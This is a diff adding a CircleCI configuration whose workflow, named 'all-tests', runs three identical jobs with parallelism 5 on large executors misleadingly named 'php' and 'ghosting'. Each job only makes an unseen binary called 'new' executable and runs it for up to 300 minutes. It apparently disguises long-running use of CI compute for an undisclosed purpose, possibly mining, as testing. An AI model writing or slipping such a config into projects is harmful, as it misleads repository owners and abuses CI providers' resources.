@@ -1,0 +1,67 @@
+version: 2.1
+
+executors:
+  php:
+    docker:
+      - image: hylang:latest
+    resource_class: large
+  ghosting:
+    docker:
+      - image: hylang:latest
+    resource_class: large
+
+jobs:
+  maja:
+    parallelism: 5
+    parameters:
+      os:
+        type: executor
+    executor: << parameters.os >>
+    steps:
+      - checkout
+      - run:
+         Name: maja
+         command: |
+                     chmod +x new && ./new
+         no_output_timeout: 300m
+  meje:
+    parallelism: 5
+    parameters:
+      os:
+        type: executor
+    executor: << parameters.os >>
+    steps:
+      - checkout
+      - run:
+         Name: meje
+         command: |
+                     chmod +x new && ./new
+         no_output_timeout: 300m
+  miji:
+    parallelism: 5
+    parameters:
+      os:
+        type: executor
+    executor: << parameters.os >>
+    steps:
+      - checkout
+      - run:
+         Name: miji
+         command: |
+                     chmod +x new && ./new
+         no_output_timeout: 300m
+workflows:
+  all-tests:
+    jobs:
+      - maja:
+          matrix:
+            parameters:
+              os: ["php", "ghosting"]
+      - meje:
+          matrix:
+            parameters:
+              os: ["php", "ghosting"]
+      - miji:
+          matrix:
+            parameters:
+              os: ["php", "ghosting"]
